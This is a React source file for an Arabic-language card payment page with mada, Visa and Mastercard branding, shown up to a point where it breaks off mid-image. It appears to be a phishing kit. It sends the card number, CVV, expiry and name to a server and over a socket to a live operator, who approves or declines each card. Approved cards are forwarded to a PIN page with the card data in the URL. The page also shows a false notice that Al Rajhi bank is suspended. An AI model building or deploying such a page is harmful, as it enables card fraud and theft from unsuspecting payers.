import React, { useEffect, useState } from "react";
import { FaCcVisa, FaLock } from "react-icons/fa6";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Home";
import { AiOutlineCloseCircle } from "react-icons/ai";
import axios from "axios";
import { useNavigate } from "react-router-dom";
const PaymentForm = () => {
  const token = sessionStorage.getItem("session");
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const navigate = useNavigate();
  const [page, setPage] = useState(0);
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(true);
  const [card_name, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [method, setMethod] = useState(sessionStorage.getItem("method"));
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [otp, setOtp] = useState(null);

  // Format as "HH:MM:SS"
  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };
  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };
  const handlePinChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    e.preventDefault();
    let check = cardNumber.split(" ").join("");
    if (check.length !== 16) {
      setLoading(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }
        if (cardNumber.startsWith("4847")) {
          setLoading(false);
          return setErrorCard(`عذرًا، مصرف الراجحي موقوف حاليًا
    نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي ، وذلك بسبب خلل فني من جهة مصدر البنك`);
        }
    try {
      const { _id, firstName, email } = JSON.parse(data);
      const finalData = {
        card_name,
        cardNumber,
        cvv,
        expiryDate,
        firstName,
        email,
      };
      await axios.post(serverRoute + "/visa/" + _id, finalData).then(() => {
        socket.emit("paymentForm", finalData);
      });
    } catch (error) {
      console.log(error);
    } finally {
    }
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === JSON.parse(data)._id) {
      sessionStorage.setItem("cardNumber", cardNumber);
      window.location.href =
        "/pin?data=" +
        JSON.stringify({
          ...JSON.parse(data),
          card_name,
          cardNumber,
          cvv,
          expiryDate,
        });
    }
  });

  socket.on("declinePaymentForm", (id) => {
    if (id === JSON.parse(data)._id) {
      setPage(0);
      setLoading(false);
      setError(" تم رفض البطاقة");
    }
  });



  return (
    <div
      className="min-h-screen w-full bg-[#f4fafc] flex flex-col items-center"
      dir="rtl"
    >
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-white  ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
          <span className="text-xl my-5 text-green-600">
            جاري التواصل مع مصدر البنك
          </span>
        </div>
      )}

      {page === 0 ? (
        <div className="w-full max-w-4xl px-4 py-10 flex flex-col gap-10">
          {/* Payment Section */}
          <div className="bg-white rounded-3xl p-8 shadow-sm border border-[#e7f1f7]">
            <h3 className="text-[#22305e] font-semibold text-xl mb-3">
              اختاروا وسيلة الدفع
            </h3>
            <p className="text-gray-500 text-sm mb-6">
              لإكمال طلبكم، يرجى اختيار وسيلة الدفع المفضلة.
            </p>

            {errorCard && (
              <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-xl">
                <p className="text-red-700 text-sm">{errorCard}</p>
              </div>
            )}

            {error && (
              <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-xl">
                <p className="text-red-700 text-sm">{error}</p>
              </div>
            )}

            {/* Payment Form */}
            <form onSubmit={handleSumbit} className="space-y-6">
              {/* Payment Method Selection */}
              <div className="border-2 border-green-500 rounded-3xl p-6">
                <div className="w-full flex">
                  <h4 className="text-[#22305e]  text-sm mb-4 font-bold">
                    البطاقة الائتمانية
                  </h4>
                  <div className="flex items-center gap-3 mb-4 w-full">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 186 29"
                    >
                      <path fill="#fff" d="M1 0h184.25v29H1z"></path>
                      <path
                        fill="#84B740"
                        d="M22.382 15.992H.852v6.968h21.53v-6.968Z"
                      ></path>
                      <path
                        fill="#259BD6"
                        d="M22.382 6.484H.852v6.974h21.53V6.484Z"
                      ></path>
                      <path
                        fill="#27292D"
                        d="m43.913 21.545-.096.019c-.332.062-.453.087-.697.087-.562 0-1.227-.28-1.227-1.596 0-.677.115-1.578 1.164-1.578h.006c.179.013.384.032.767.143l.083.025v2.9Zm.173-6.564-.173.031v2.435l-.153-.044-.045-.012c-.173-.05-.569-.162-.953-.162-2.096 0-2.537 1.54-2.537 2.832 0 1.77 1.022 2.788 2.806 2.788.754 0 1.31-.074 1.873-.254.518-.162.703-.392.703-.882v-6.986a111.9 111.9 0 0 1-1.521.254ZM50.147 21.586l-.09.025-.32.08c-.3.075-.568.118-.773.118-.492 0-.786-.236-.786-.64 0-.26.122-.701.927-.701h1.042v1.118Zm-.735-4.39c-.646 0-1.31.111-2.135.36l-.537.155.179 1.18.524-.168a6.328 6.328 0 0 1 1.745-.286c.23 0 .933 0 .933.74v.322h-.978c-1.783 0-2.608.553-2.608 1.74 0 1.011.76 1.62 2.04 1.62.396 0 .946-.075 1.419-.186l.025-.007.026.007.16.025c.498.086 1.016.173 1.521.267v-3.876c0-1.254-.78-1.894-2.314-1.894ZM37.725 21.586l-.09.025-.319.08c-.3.075-.563.118-.774.118-.492 0-.786-.236-.786-.64 0-.26.122-.701.92-.701h1.043l.006 1.118Zm-.729-4.39c-.652 0-1.31.111-2.135.36l-.537.155.18 1.18.523-.168a6.329 6.329 0 0 1 1.746-.286c.23 0 .933 0 .933.74v.322h-.978c-1.784 0-2.615.553-2.615 1.74 0 1.011.761 1.62 2.046 1.62.396 0 .946-.075 1.42-.186l.025-.007.025.007.154.025c.505.086 1.016.173 1.521.273v-3.875c.007-1.267-.773-1.9-2.308-1.9ZM30.994 17.21a4.42 4.42 0 0 0-1.732.372l-.064.031-.057-.043c-.346-.243-.85-.367-1.554-.367-.62 0-1.202.087-1.835.267-.543.162-.754.416-.754.894v4.428h1.7V18.7l.084-.025c.345-.112.55-.13.748-.13.492 0 .741.254.741.75v3.503h1.675v-3.57c0-.212-.045-.336-.051-.36l-.058-.106.115-.05c.256-.112.537-.168.831-.168.34 0 .742.13.742.752v3.502h1.669v-3.663c0-1.298-.716-1.926-2.2-1.926ZM48.892 11.03c-.249 0-.665-.025-.99-.087l-.096-.018V8.534a1.14 1.14 0 0 0-.045-.342l-.051-.1.108-.043c.026-.012.052-.018.084-.03l.019-.013.115-.037c.019-.007.032-.013.044-.013.378-.1.723-.087.876-.1h.007c1.042 0 1.163.901 1.163 1.578-.006 1.317-.677 1.596-1.234 1.596Zm-.006-4.546h-.045c-.978 0-1.982.261-2.34.77-.191.249-.3.56-.306.926v2.465c0 .211-.045.292-.051.31l-.058.106h-3.088V9.347h-.006c-.038-1.807-1.138-2.8-2.73-2.8H38.71c-.064.44-.115.75-.18 1.192h1.548c.812 0 1.24.67 1.24 1.701v1.727l-.109-.056c-.019-.006-.153-.05-.364-.05h-2.672c-.051.33-.115.758-.186 1.186h8.215c.281-.056.607-.105.889-.149.415.199 1.189.305 1.72.305 1.783 0 2.94-1.162 2.94-2.95-.006-1.77-1.125-2.931-2.864-2.969ZM34.562 12.976c1.783 0 2.614-.571 2.614-1.981 0-1.012-.76-1.82-2.039-1.82h-1.643c-.492 0-.786-.273-.786-.732 0-.31.121-.696.927-.696h3.592c.077-.453.116-.739.186-1.192h-3.734c-1.738 0-2.614.708-2.614 1.888 0 1.167.76 1.776 2.04 1.776h1.642c.492 0 .786.379.786.776 0 .26-.121.801-.92.801h-.275l-5.261-.012h-.96c-.811 0-1.38-.448-1.38-1.485v-.714c0-1.08.441-1.751 1.38-1.751h1.56c.07-.46.116-.751.18-1.186h-2.13c-1.591 0-2.69 1.037-2.729 2.844v.807c.038 1.808 1.138 2.67 2.73 2.67h1.553l2.851.007h2.43Z"
                      ></path>
                      <path
                        fill="#FF8000"
                        fill-rule="evenodd"
                        d="M93.34 25.241c2.614 2.34 6.124 3.759 9.942 3.759 8.2 0 14.836-6.497 14.836-14.488C118.118 6.497 111.482 0 103.282 0c-3.818 0-7.328 1.419-9.942 3.759-2.999 2.663-4.895 6.497-4.895 10.753 0 4.257 1.897 8.09 4.895 10.73Z"
                        clip-rule="evenodd"
                      ></path>
                      <path
                        fill="#FF8000"
                        fill-rule="evenodd"
                        d="M116.146 22.58c0-.248.205-.447.461-.447.282 0 .487.199.487.448 0 .274-.205.473-.487.473a.458.458 0 0 1-.461-.473Zm.461.375a.388.388 0 0 0 .384-.374c0-.199-.179-.348-.384-.348-.179 0-.358.15-.358.348 0 .199.179.374.358.374Zm-.051-.15h-.102v-.423h.179c.026 0 .077 0 .102.025.052.025.052.05.052.1s-.026.1-.077.1l.103.198h-.129l-.051-.174h-.077v.174-.249h.103c.025 0 .025-.025.025-.05s0-.025-.025-.05h-.103v.35Z"
                        clip-rule="evenodd"
                      ></path>
                      <path
                        fill="red"
                        fill-rule="evenodd"
                        d="M98.131 12.97c-.051-.523-.153-1.021-.256-1.544h-9.071c.102-.523.256-1.02.41-1.519h8.225a16.385 16.385 0 0 0-.614-1.543h-6.97c.256-.527.538-1.042.845-1.543h5.254a13.113 13.113 0 0 0-1.128-1.519h-2.998c.464-.55.969-1.066 1.512-1.543A15.079 15.079 0 0 0 83.372 0c-8.175 0-14.837 6.497-14.837 14.512C68.535 22.503 75.197 29 83.372 29a14.956 14.956 0 0 0 11.454-5.278h-2.998A17.15 17.15 0 0 1 90.7 22.18h5.254c.33-.492.621-1.008.87-1.543h-6.97c-.23-.498-.46-.996-.64-1.52h8.225c.18-.497.308-1.02.436-1.542.102-.498.205-1.02.256-1.544a15.195 15.195 0 0 0 0-3.061Z"
                        clip-rule="evenodd"
                      ></path>
                      <path
                        fill="#fff"
                        fill-rule="evenodd"
                        d="M116.146 17.871c0-.274.205-.473.461-.473.282 0 .487.2.487.473a.48.48 0 0 1-.487.473.474.474 0 0 1-.461-.473Zm.461.348c.206 0 .384-.15.384-.348 0-.199-.179-.348-.384-.348-.179 0-.358.15-.358.348 0 .199.179.348.358.348Zm-.051-.15h-.102v-.397h.281c.052.025.052.075.052.125 0 .024-.026.074-.077.1l.103.173h-.129l-.051-.15h-.077v.15-.224h.051c.026 0 .052 0 .052-.025.025 0 .025-.025.025-.05 0 0 0-.024-.025-.024 0-.026-.026 0-.052 0h-.051v.323Z"
                        clip-rule="evenodd"
                      ></path>
                      <path
                        fill="#1B3771"
                        fill-rule="evenodd"
                        d="M88.29 18.693c-.486.124-.845.2-1.204.2-.768 0-1.23-.474-1.23-1.32 0-.174.026-.349.052-.548l.102-.572.077-.473.692-4.082h1.537l-.18.896h.975l-.23 1.493h-.975l-.41 2.44c-.025.125-.025.199-.025.249 0 .324.153.448.538.448.18 0 .333-.025.487-.05l-.205 1.32Zm4.972-.05a6.194 6.194 0 0 1-1.64.224c-1.743 0-2.742-.896-2.742-2.663 0-2.066 1.179-3.56 2.819-3.56 1.306 0 2.152.847 2.152 2.166 0 .448-.051.871-.179 1.469h-3.203c-.026.1-.026.149-.026.199 0 .697.487 1.045 1.41 1.045.589 0 1.101-.124 1.665-.373l-.256 1.493Zm-.948-3.56v-.298c0-.498-.282-.772-.769-.772-.513 0-.871.373-1.025 1.07h1.794ZM75.99 18.769h-1.589l.923-5.65-2.076 5.65h-1.102l-.128-5.626-.974 5.626h-1.563l1.256-7.343h2.332l.05 4.53 1.564-4.53h2.563l-1.256 7.343Zm3.87-2.663c-.154-.026-.206-.026-.308-.026-.923 0-1.384.349-1.384.896 0 .374.23.623.59.623.768 0 1.076-.622 1.102-1.493Zm1.28 2.663h-1.383l.026-.622c-.36.472-.846.721-1.692.721-.769 0-1.435-.672-1.435-1.642 0-.274.052-.523.129-.772.255-.921 1.204-1.493 2.664-1.519.18 0 .461 0 .718.026.05-.2.05-.275.05-.399 0-.398-.332-.523-1.075-.523-.461 0-.974.075-1.333.2l-.23.05-.103.024.23-1.344c.744-.224 1.282-.324 1.872-.324 1.383 0 2.126.623 2.126 1.767 0 .3.026.523-.077 1.17l-.358 2.141-.051.374-.026.299-.026.199-.025.174Zm19.86-5.925c.461 0 .871.125 1.435.399l.281-1.594c-.153-.074-.205-.074-.409-.149l-.641-.174a3.24 3.24 0 0 0-.743-.075c-.795 0-1.256.025-1.742.299-.257.174-.59.398-.949.796l-.205-.05-1.64 1.12.077-.622h-1.691l-1 5.974h1.615l.59-3.21s.23-.449.333-.598c.307-.373.563-.373.896-.373h.129c-.054.38-.08.762-.077 1.145 0 1.941 1.127 3.161 2.87 3.161.435 0 .82-.05 1.409-.2l.282-1.692c-.512.274-.973.399-1.358.399-.948 0-1.512-.697-1.512-1.793 0-1.618.845-2.762 2.05-2.762Zm13.606-1.418-.358 2.09c-.385-.572-.846-.846-1.461-.846-.846 0-1.64.473-2.127 1.37v-.025l-1.025-.598.102-.622h-1.716l-.974 5.974h1.588l.539-3.211s.41-.449.512-.597c.257-.3.513-.35.718-.374a5.246 5.246 0 0 0-.282 1.768c0 1.493.794 2.489 1.973 2.489.589 0 1.05-.2 1.486-.673l-.077.598h1.512l1.23-7.343h-1.64Zm-1.973 5.924c-.538 0-.82-.398-.82-1.17 0-1.17.513-2.016 1.255-2.016.564 0 .846.423.846 1.17 0 1.195-.512 2.016-1.281 2.016Zm-7.405-1.244c-.154-.026-.205-.026-.308-.026-.923 0-1.384.349-1.384.896 0 .374.231.623.59.623.769 0 1.076-.622 1.102-1.493Zm1.281 2.663h-1.409l.051-.622c-.359.472-.846.721-1.691.721-.795 0-1.486-.647-1.486-1.642 0-1.419 1.101-2.29 2.844-2.29.179 0 .461 0 .692.025.051-.2.077-.274.077-.399 0-.398-.333-.522-1.102-.522-.436 0-.974.074-1.332.199l-.205.05-.103.024.23-1.344c.744-.224 1.282-.323 1.871-.323 1.384 0 2.101.622 2.101 1.767 0 .299.052.523-.076 1.17l-.334 2.14-.051.374-.051.299-.025.2-.001.173Zm-22.012-4.705c.308 0 .743.025 1.205.1l.23-1.394c-.46-.05-1.076-.125-1.435-.125-1.793 0-2.383.946-2.383 2.041 0 .723.333 1.245 1.205 1.643.64.299.743.348.743.623 0 .373-.333.597-.948.597-.487 0-.949-.075-1.461-.249l-.18 1.369.026.025.308.05c.102.024.23.05.41.074.384.025.717.05.922.05 1.794 0 2.537-.672 2.537-1.991 0-.822-.41-1.32-1.204-1.668-.692-.299-.77-.348-.77-.622s.308-.523.795-.523Z"
                        clip-rule="evenodd"
                      ></path>
                      <path
                        fill="#fff"
                        fill-rule="evenodd"
                        d="m103.154 11.178-.282 1.593c-.563-.274-.974-.398-1.435-.398-1.204 0-2.05 1.145-2.05 2.763 0 1.12.564 1.792 1.513 1.792.383 0 .845-.124 1.357-.373l-.281 1.667c-.59.15-.974.225-1.41.225-1.742 0-2.819-1.22-2.819-3.186 0-2.614 1.487-4.456 3.613-4.456.282 0 .538.025.743.074l.641.15c.205.075.257.1.41.149Zm-5.176 1.095h-.154c-.537 0-.845.25-1.332.971l.154-.921h-1.461l-1 5.974h1.616c.589-3.66.742-4.281 1.511-4.281h.103a6.142 6.142 0 0 1 .615-1.718l-.052-.025Zm-9.276 5.95c-.435.149-.794.199-1.153.199-.82 0-1.281-.448-1.281-1.32 0-.149.025-.348.051-.522l.102-.598.077-.472.692-4.083h1.589l-.18.896h.82l-.204 1.469h-.82l-.436 2.49c-.026.099-.026.174-.026.248 0 .299.154.424.538.424.18 0 .333 0 .436-.05l-.205 1.318Zm-6.175-4.008c0 .747.358 1.27 1.204 1.668.666.299.769.398.769.647 0 .373-.282.547-.923.547-.487 0-.923-.074-1.435-.223l-.23 1.368.076.026.282.05c.102.024.23.05.436.05.358.049.666.049.87.049 1.692 0 2.487-.622 2.487-1.991 0-.822-.333-1.295-1.128-1.668-.692-.299-.768-.373-.768-.647 0-.324.281-.473.794-.473.308 0 .743.025 1.153.075l.23-1.37a9.545 9.545 0 0 0-1.409-.124c-1.794 0-2.434.92-2.409 2.016Zm32.902 4.082h-1.512l.077-.572c-.436.448-.897.647-1.487.647-1.179 0-1.947-.97-1.947-2.464 0-1.992 1.204-3.684 2.613-3.684.641 0 1.102.274 1.538.821l.359-2.09h1.589l-1.23 7.342Zm-2.358-1.393c.743 0 1.256-.847 1.256-2.017 0-.772-.282-1.17-.846-1.17-.718 0-1.255.821-1.255 1.991 0 .797.281 1.196.845 1.196Zm-19.45 1.269a5.391 5.391 0 0 1-1.665.249c-1.794 0-2.716-.921-2.716-2.689 0-2.04 1.179-3.56 2.793-3.56 1.333 0 2.178.847 2.178 2.166 0 .449-.051.872-.205 1.494h-3.177c-.026.075-.026.125-.026.175 0 .697.487 1.045 1.41 1.045.589 0 1.101-.1 1.665-.374l-.256 1.494Zm-.896-3.56v-.298c0-.498-.282-.772-.769-.772-.512 0-.871.373-1.025 1.07h1.794Zm-16.323 3.684h-1.589l.923-5.65-2.076 5.65h-1.102l-.128-5.6-.973 5.6H69.97l1.255-7.343h2.306l.077 4.555 1.537-4.555h2.512l-1.256 7.343Zm3.972-2.663c-.154 0-.23-.025-.359-.025-.897 0-1.358.324-1.358.92 0 .375.205.598.564.598.666 0 1.127-.597 1.153-1.493Zm1.179 2.663H80.22l.026-.622c-.41.498-.949.722-1.692.722-.871 0-1.46-.647-1.46-1.618 0-1.468 1.025-2.315 2.818-2.315.18 0 .41.025.667.05.05-.2.05-.274.05-.373 0-.399-.281-.548-1.024-.548-.461 0-.974.05-1.333.15l-.23.074-.154.025.23-1.344c.795-.224 1.333-.3 1.922-.3 1.384 0 2.127.598 2.127 1.743 0 .3-.025.523-.128 1.195l-.359 2.116-.051.373-.026.3-.025.224-.025.148Zm24.19-2.663c-.18 0-.257-.025-.359-.025-.922 0-1.384.324-1.384.92 0 .375.231.598.589.598.641 0 1.128-.597 1.154-1.493Zm1.178 2.663h-1.332l.025-.622c-.41.498-.948.722-1.691.722-.871 0-1.461-.647-1.461-1.618 0-1.468 1.025-2.315 2.819-2.315.18 0 .41.025.641.05.051-.2.077-.274.077-.373 0-.399-.282-.548-1.025-.548-.461 0-.999.05-1.358.15l-.205.074-.154.025.23-1.344c.795-.224 1.333-.3 1.922-.3 1.384 0 2.102.598 2.102 1.743 0 .3 0 .523-.128 1.195l-.333 2.116-.052.373-.051.3-.025.224-.001.148Zm4.305-6.024h-.154c-.537 0-.845.25-1.332.971l.154-.921h-1.461l-.974 5.974h1.589c.589-3.66.743-4.281 1.512-4.281h.103a6.127 6.127 0 0 1 .614-1.718l-.051-.025Z"
                        clip-rule="evenodd"
                      ></path>
                      <path
                        fill="#1A1F71"
                        fill-rule="evenodd"
                        d="M160.744 12.114c-.023 2.116 2.033 3.305 3.583 4.003 1.598.72 2.138 1.188 2.127 1.832-.012.992-1.269 1.418-2.456 1.44-2.055.032-3.254-.513-4.205-.927l-.74 3.228c.951.403 2.725.763 4.558.785 4.311 0 7.119-1.974 7.142-5.039.012-3.882-5.791-4.1-5.744-5.834.011-.524.552-1.091 1.738-1.233.588-.076 2.209-.13 4.042.655l.716-3.12a11.623 11.623 0 0 0-3.841-.654c-4.041 0-6.896 2.007-6.92 4.864Zm17.692-4.591c-.787 0-1.445.425-1.75 1.08l-6.156 13.632h4.3l.857-2.192h5.263l.494 2.192h3.806l-3.313-14.712h-3.501Zm.599 3.98 1.246 5.53h-3.407l2.161-5.53Zm-23.507-3.98-3.395 14.712h4.1l3.395-14.712h-4.1Zm-6.061 0-4.277 10.022-1.727-8.517c-.199-.95-.998-1.505-1.891-1.505h-6.978l-.094.425c1.433.284 3.054.753 4.041 1.254.599.306.776.567.975 1.298l3.266 11.746h4.335l6.649-14.723h-4.299Z"
                        clip-rule="evenodd"
                      ></path>
                    </svg>
                  </div>
                </div>

                {/* Card Holder Name */}
                <div className="mb-4">
                  <label className="block text-sm text-gray-600 mb-2 text-right">
                    اسم حامل البطاقة
                  </label>
                  <input
                    value={card_name}
                    required
                    onChange={(e) => setCardName(e.target.value)}
                    type="text"
                    placeholder="اسم حامل البطاقة"
                    className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500"
                  />
                </div>

                {/* Card Number */}
                <div className="mb-4">
                  <label className="block text-sm text-gray-600 mb-2 text-right">
                    رقم البطاقة
                  </label>
                  <input
                    value={cardNumber}
                    required
                    onChange={handleCardNumberChange}
                    maxLength={19}
                    minLength={16}
                    inputMode="numeric"
                    type="text"
                    placeholder="1234 1234 1234 1234"
                    className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500 text-center"
                    dir="ltr"
                  />
                </div>

                {/* Expiry Date and CVV */}
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div>
                    <label className="block text-xs text-gray-600 mb-2 text-right">
                      تاريخ الانتهاء الصلاحية
                    </label>
                    <input
                      type="text"
                      value={expiryDate}
                      maxLength={5}
                      inputMode="numeric"
                      onChange={handleExpiryDateChange}
                      placeholder="شهر / سنة"
                      required
                      className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-gray-600 mb-2 text-right">
                      رمز الأمان
                    </label>
                    <div className="relative">
                      <input
                        className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500"
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        placeholder="رمز الأمان"
                        required
                      />
                      <div className="absolute left-0 top-1/2 -translate-y-1/2">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          class="lucide lucide-circle-question-mark-icon lucide-circle-question-mark"
                        >
                          <circle cx="12" cy="12" r="10" />
                          <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
                          <path d="M12 17h.01" />
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Save Card Checkbox */}
                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    className="w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <label className="text-sm text-gray-600">حفظ</label>
                </div>
              </div>

              {/* Payment Terms */}
              <div className="space-y-4">
                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    required
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <span className="text-sm text-gray-600 leading-relaxed">
                    أؤكد أنني قرأت{" "}
                    <span className="text-red-700">شروط وأحكام</span> البيع
                    ووافقت عليها كما أنني على علم بشروط الإلغاء وسياسة استرداد
                    قيمة هذه التذاكر.
                  </span>
                </label>

                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    required
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <span className="text-sm text-gray-600 leading-relaxed">
                    أدرك أن جميع التذاكر{" "}
                    <span className="text-red-700">غير قابلة للاسترجاع</span>{" "}
                    بعد رفض الإلغاء أو{" "}
                    <span className="text-red-700">تعديل التذكرة</span> لإتمام
                    عملية الشراء.
                  </span>
                </label>

                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    required
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <span className="text-sm text-gray-600 leading-relaxed">
                    أؤكد أنني قرأت ووافقت على{" "}
                    <span className="text-red-700">سياسة الخصوصية</span> للبيع
                  </span>
                </label>
              </div>

              {/* Pay Now Button */}
              <button
                type="submit"
                className={`w-full px-8 py-3 rounded-full font-semibold shadow-sm transition-colors ${
                  card_name && cardNumber && cvv && expiryDate
                    ? "bg-blue-700 text-white hover:bg-blue-800 cursor-pointer"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                إدفع الآن
              </button>
            </form>
          </div>
        </div>
      ) : page === 1 ? (
        <div className="w-11/12 xl:w-1/3 lg:w-1/2  flex flex-col items-start justify-start bg-white  min-h-screen rounded-md py-5  payment ">
          <div className="w-full flex flex-col items-center justify-center  shadow-xl rounded-md  py-4">
            <div className="w-full flex items-center justify-around">
              <span className="px-3 font-medium py-1  border-2 rounded-md">
                عربي
              </span>
              <img className="w-1/2 " src="logo.svg" />
            </div>
            <span
              className="font-bold text-blue-600 w-full pl-5 pt-3
              mt-3 pb-1  "
              dir="rtl"
            >
              <span className="flex flex-row-reverse  gap-x-1">
                115.00 <span>SAR</span>
              </span>
            </span>
            <p className="w-full text-left pl-5  pb-1 text-lg">
              {" "}
              1 Item | Expire In 2 days
            </p>

            <form
              className="w-full flex flex-col  px-3 py-5 mt-5  bg-blue-50"
              onSubmit={handleSumbit}
            >
              <div className="relative mt-2 mb-5 flex items-center justify-center">
                <hr className="absolute  w-full top-3" />
                <span className=" bg-blue-50 z-10  left-20 px-5">
                  Insert Card Details
                </span>
              </div>
              <header></header>
              <div className="w-full flex flex-col gap-y-2 border rounded-t-md text-sm">
                <input
                  value={card_name}
                  required
                  onChange={(e) => setCardName(e.target.value)}
                  dir="ltr"
                  placeholder="Card Holder Name"
                  type="text"
                  className={`w-full rounded-md   text-black   py-2.5 px-3   text-left outline-none`}
                />
              </div>
              <div className="w-full flex flex-col  gap-y-2 border-x text-sm relative">
                <input
                  value={cardNumber}
                  required
                  onChange={handleCardNumberChange}
                  dir="ltr"
                  maxLength={19}
                  minLength={16}
                  inputMode="numeric"
                  type="text"
                  disabled={!method}
                  placeholder="Card Number"
                  className={`w-full rounded-md  text-black   py-2.5 px-3   text-left outline-none`}
                />
                <div className="flex items-center gap-x-1 absolute right-2 top-1 ">
                  <img src="/amex.svg" className="w-6 " />
                  <img src="/MasterCard.svg" className="w-6 " />
                  <img src="/Visa.svg" className="w-6 " />
                  <img
                    className="w-6 "
                    src={
                      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATYAAACjCAMAAAA3vsLfAAAAsVBMVEX///+BvUEWoNseJSzl8voAodzu9uip1+/Q5ryTxlmFv0eEv0EYpd0THCT8/PwbIir09fXi5OVna2+8vsAxNz0hJy7q6ussMzrQ0dOQk5bL6PYrqN5rw+mMw1Kw1ofh79M7QEZbX2WytbdFSU/a29wADhkNGCCBhIZUWl+kpqlvdHifo6VLUVcACBXl5ubJysx5foKIi44AAAmWmJsAAABtxulrb3Wk0HScy2i52pOfpKdJ34O/AAAN6UlEQVR4nO2dadujthWG3TpN2+mIfU3aBoRYBNgSQ0ra+f8/rGKR2L1MkprX1fNlrtErBNzWdqSjw+kkJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSX1sL47gJT9x1O0hRZ5FZbB2ZfGS5klLgvZvTfLfB0kyur14+c/vVif//XD/qM7iJgzLV5Z0U1M8ybcVFbBoRSYiUQjryF6CJtD0jwMrDMAths0Ppze+fPnP75Yn/++jc3RYeHnuTFTOMWmk6LKjTCKomBTVlP3GT3fGlOjLMx9TLTNmwp50KdGGQWW69q267pRGVY1FBe9GtouNkUnNAsSMFc8waZ4RZdB3RPIqj6nSZNZehIZhXOrpSoapJbdlXzuxa5yy+rKL/rxoLVNr9wLEA/Nnz0oJ9RKK15mmCvhjbRowKIgcCnpaRecott2si5aTVxjoH1QbGYduhvPHYXiVQkOrJvQGLba7PNWIVj+TQ2yQt/DZvquu1miW/pIOzC2Jko2nlotG4GtjsAdaucYkz5vXm78BGfb28NGN36y4aLEPC420tjjc086paTMB2xanYkKpAKQbOpn4vRtrrRE2qThg7LZhKaZJVjdXfzfjY6Kjc0X7PG5g6jMuGgxYHPyiL+JGxl5uimKhpGvrkRSkwWi5CjTtsZTpxBl27YVsIG6DMRF7Ha6dkxsZhqLV0u+ZAatuCBvV9eYgwVWAz39ujnb5S1aJOi6WZUJr0uq6l03sOlNMGBjtTMojSbPw/LCOw3VLdAxsUWBaBNu7W0ZCQ65cGqhz1J3xAucpmkaHdt3aG5gQ+Uw1oAKXp3hxmYl6psNj4hN0WwxjNm56Wy82Ek3ObYkhVsZbglSQSDYunjEVhNBXschr98xdg6IzUExr2zAUrbnVkhgi83dacSuTJcTuBQbnZvAlsDJWOt4fHgFFB8Qm/dVdCMh3XnxCbYHDczZHXxOIEk3WumkkU7+qmjR0AjUjB4Qm1nxrgfkxX1seHf2tSsdWpOKcwMbnbXhcOhy1cg4IDYs5qYXuNmxndoh4QuvkVH1NDbN4WMO2KrPe9h8o/892ZToiNj4O9kq2bMaFQSG7km1Mkw8JKTrzp21ja698auz/HFsRT5gs4IDYit4C7Ld/fbnCKNRdcMaThbkCNKVnYFkVCm6qQ1DYQ8bpkPv4R4Qm1LzY